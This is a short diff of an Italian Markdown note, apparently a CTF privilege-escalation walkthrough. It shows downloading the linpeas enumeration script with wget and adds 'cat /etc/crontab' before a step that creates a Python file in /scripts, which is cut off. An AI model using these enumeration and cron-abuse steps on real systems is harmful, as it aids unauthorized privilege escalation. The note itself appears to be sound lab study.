@@ -125,7 +125,11 @@ Scarica linpeas ed avvialo
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
 ```
+
 ![[Pasted image 20231012165416.png]]
+```bash
+cat /etc/crontab
+```
 Vai in /scripts e crea un file random.py
 ```python
 import os
